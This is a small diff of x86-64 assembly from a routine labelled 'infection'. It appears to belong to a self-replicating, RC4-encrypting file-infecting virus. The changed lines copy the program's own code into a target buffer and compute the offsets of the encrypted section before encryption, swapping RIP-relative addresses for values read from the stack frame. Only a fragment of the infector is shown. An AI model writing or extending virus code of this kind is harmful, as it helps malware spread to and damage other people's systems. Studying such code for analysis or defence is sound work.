@@ -193,19 +193,31 @@ infection:
 	mov rbx, rax
 
 	mov rdi, rbx
-	lea rsi, [rel _start]
+
+
+	mov		rsi, [rbp + 8]
+	;lea rsi, [rel _start]
+
+
 	mov rcx, WAR_SIZE_NO_BSS
 	rep movsb
 
 	mov rdi, rbx
-	lea rax, [rel _encrypted_start]
-	lea rcx, [rel _start]
+	mov		rax, [rbp + 24]
+	;lea rax, [rel _encrypted_start]
+
+	mov		rcx, [rbp + 8]
+	;lea rcx, [rel _start]
+
 	sub rax, rcx
 	add rdi, rax
 
 	; RC4
-	lea rdx, [rel _stop]
-	lea rcx, [rel _encrypted_start]
+	mov		rdx, [rbp + 16]
+	;lea rdx, [rel _stop]
+
+	mov		rcx, [rbp + 24]
+	;lea rcx, [rel _encrypted_start]
 	sub rdx, rcx
 	mov rsi, rdx
 	xor rdx, rdx
